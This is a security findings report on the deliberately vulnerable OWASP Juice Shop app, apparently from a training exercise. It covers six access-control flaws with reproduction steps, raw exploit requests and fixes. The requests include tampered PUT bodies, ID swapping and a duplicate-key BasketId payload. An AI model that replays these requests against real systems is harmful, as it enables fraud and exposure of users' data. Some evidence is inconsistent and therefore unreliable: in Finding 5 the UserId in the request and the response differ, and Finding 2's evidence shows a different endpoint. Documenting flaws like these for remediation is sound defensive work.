# OWASP Juice Shop — Broken Access Control Findings

## Finding 1: Product Tampering via Missing Authorization Check

**Severity:** High
**Endpoint:** `PUT /api/Products/{id}`

### Description
The `/api/Products/{id}` endpoint does not verify the requesting user's role before allowing updates. Any authenticated user, regardless of role, can modify product data including name, price, and description.

### Steps to Reproduce
1. Log in as any regular (non-admin) user.
2. Browse to any product page and note its product ID.
3. Intercept a request to that product using Burp Suite.
4. Send a `PUT /api/Products/{id}` request with a modified JSON body (e.g., altered price or description) using the normal user's Bearer token.
5. Observe the response — the update succeeds with `200 OK` and the changed data is reflected.

### Evidence

**Request:**
```http
PUT /api/products/24 HTTP/1.1
Host: 0.0.0.0:3000
Content-Type: application/json
Authorization: Bearer <normal_user_token>

{"price":255}
```

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8

{"status":"success","data":{"id":24,"name":"Apple Pomace","price":255,...}}
```

### Impact
Any authenticated user can alter product pricing or descriptions, potentially enabling financial fraud (e.g., setting a product's price to ₹1) or reputational damage through malicious/defamatory product descriptions visible to all customers.

### Recommendation
Implement server-side authorization middleware on the `PUT /api/Products/{id}` endpoint to verify the requesting user's role is `admin` before processing the update. Reject requests from non-admin users with a `403 Forbidden` response.


## Finding 2: Unauthorized Access to Admin Section

**Severity:** High
**Endpoint:** `http://0.0.0.0:3000/#/administration`

### Description
The `/#/administration` route is exposed in the client-side `main.js` file. By inspecting the source code, the administration endpoint path was discovered and accessed, granting access to a regular customer account.

### Steps to Reproduce
1. Log in as any regular (non-admin) user.
2. Browse to `http://0.0.0.0:3000/#/administration`.
3. Observe access to the admin page.

### Evidence

**Request:**
```http
GET /rest/user/authentication-details/ HTTP/1.1
Host: 0.0.0.0:3000
Accept-Language: en-US,en;q=0.9
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Referer: http://0.0.0.0:3000/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

**Response:**
```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Content-Type: application/json; charset=utf-8
Content-Length: 8566
```

### Impact
Any authenticated user can access the admin section, potentially enabling deletion of reviews, modification of user accounts, and unauthorized access to administrative functions affecting all users.

### Recommendation
Implement server-side authorization middleware on the `/#/administration` route and its supporting API endpoints to verify the requesting user's role is `admin` before granting access. Reject requests from non-admin users with a `403 Forbidden` response.



## Finding 3: Unauthorized Access to Full User List via /api/Users

**Severity:** High
**Endpoint:** `GET /api/Users`

### Description
The `/api/Users` endpoint does not verify the requesting user's role or authentication status before returning data. Any user, including regular (non-admin) authenticated users, can retrieve the complete list of registered users, including sensitive fields (email, hashed password, role).

### Steps to Reproduce
1. Log in as any regular (non-admin) user (or attempt without logging in at all).
2. Send a `GET` request to `/api/Users` using Burp Suite or a browser.
3. Observe the response — the full list of user records is returned with `200 OK`.

### Evidence
**Request:**
```http
GET /api/Users HTTP/1.1
Host: 0.0.0.0:3000
Authorization: Bearer <normal_user_token>
```

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8

{"status":"success","data":[{"id":1,"email":"admin@juice-sh.op","role":"admin",...}, ...]}
```

### Impact
Exposure of all registered users' data — including email addresses, hashed passwords, and roles — enables account enumeration, targeted credential attacks, and identification of privileged (admin) accounts for further attack.

### Recommendation
Implement server-side authorization checks on `/api/Users` to restrict access to admin-role users only. Return `403 Forbidden` for unauthorized roles.



## Finding 4: View Another User's Basket (IDOR)

**Severity:** Low
**Endpoint:** `GET /rest/basket/{id}`

### Description
The `/rest/basket/{id}` endpoint does not verify that the requesting user owns the basket being accessed. Any authenticated user can retrieve another user's basket contents by simply changing the `id` value in the request.

### Steps to Reproduce
1. Log in as any regular (non-admin) user.
2. Open your own basket and capture the request using Burp Suite.
3. Change the `id` value in the URL to a different number and resend — the response returns `200 OK` with another user's basket contents.

### Evidence

**Request:**
```http
GET /rest/basket/5 HTTP/1.1
Host: 0.0.0.0:3000
Authorization: Bearer <normal_user_token>
```

**Response:**
```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff

{"status":"success","data":{"id":5,"coupon":null,"UserId":16,"createdAt":"2026-08-21T06:16:25.668Z","updatedAt":"2026-08-21T06:16:25.668Z","Products":[{"id":3,...}
```

### Impact
Exposure of another user's basket contents (products, coupon codes) could enable targeted phishing attacks, where an attacker uses knowledge of a victim's actual purchases to craft convincing, personalized scam messages (e.g., fake order-issue emails referencing real items in their basket).

### Recommendation
The backend should verify that the id field from the requesting user's JWT token matches the UserId field on the requested basket, before returning the basket data. Requests where these do not match should be rejected with a 403 Forbidden response.


## Finding 5: Forged Feedback and Review Authorship (Broken Access Control)

**Severity:** Medium
**Endpoints:** `POST /api/Feedbacks/`, `PUT /rest/products/{id}/reviews`

### Description
Both endpoints accept a `UserId` field directly in the request body without verifying it against the authenticated user's actual identity (from their JWT token). This allows any authenticated user to submit feedback or reviews that appear to originate from a different, arbitrary user.

### Steps to Reproduce
1. Log in as any regular (non-admin) user.
2. Submit feedback or a product review through the UI, and capture the request in Burp Suite.
3. In the intercepted request body, change the `UserId` field to a different user's ID.
4. Forward the request — the response confirms the feedback/review is saved under the forged `UserId`, not the actual logged-in user.

### Evidence

**Request:**
```http
POST /api/Feedbacks/ HTTP/1.1
Host: 0.0.0.0:3000
Content-Type: application/json
Authorization: Bearer <normal_user_token>

{"UserId":25,"captchaId":0,"captcha":"10","comment":"null (***ul@yopmail.com)","rating":5}
```

**Response:**
```http
HTTP/1.1 201 Created
Content-Type: application/json; charset=utf-8

{"status":"success","data":{"id":9,"UserId":20,"comment":"null (***ul@yopmail.com)","rating":5,...}}
```

### Impact
An attacker can post fraudulent feedback or reviews under another user's identity, damaging that user's reputation, or manipulating a product's perceived rating/credibility by impersonating multiple accounts.

### Recommendation
The backend should ignore any `UserId` supplied in the request body and instead derive it from the authenticated user's JWT token. This prevents identity forgery on submitted content.



## Finding 6: Manipulate Basket via HTTP Parameter Pollution (Duplicate JSON Keys)

**Severity:** High
**Endpoint:** `POST /api/BasketItems/`

### Description
The `/api/BasketItems/` endpoint is vulnerable to HTTP Parameter Pollution. When a request body contains a duplicate `BasketId` key, the backend's authorization check validates against the first occurrence (the user's own basket), while the database insert uses the last occurrence (an arbitrary basket ID). This allows a user to add products to another user's basket.

### Steps to Reproduce
1. Log in as any regular (non-admin) user.
2. Add a product to your basket and capture the request in Burp Suite.
3. In the JSON payload, add a duplicate `BasketId` key with a different value at the end, e.g.:
```json
   {"ProductId":1,"BasketId":"6","quantity":1,"BasketId":"5"}
```
4. Forward the request — the response confirms the product was added to the second (foreign) `BasketId`, not your own.

### Evidence

**Request:**
```http
POST /api/BasketItems/ HTTP/1.1
Host: 0.0.0.0:3000
Content-Type: application/json
Authorization: Bearer <normal_user_token>

{"ProductId":1,"BasketId":"6","quantity":1,"BasketId":"5"}
```

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8

{"status":"success","data":{"id":10,"ProductId":1,"BasketId":"5","quantity":1,...}}
```

### Impact
An attacker can add unwanted products to another user's basket, potentially manipulating them into purchasing items they didn't intend to buy, resulting in financial loss or a degraded user experience.

### Recommendation
Reject any request body containing duplicate JSON keys (e.g., duplicate `BasketId` fields) at the input validation/parsing layer, ensuring only a single, unambiguous value is processed throughout the request lifecycle. Additionally, the backend should not trust a client-supplied `BasketId` at all — it should derive the basket ID from the authenticated user's own session/token rather than accepting it as a request parameter, eliminating this class of bug entirely.

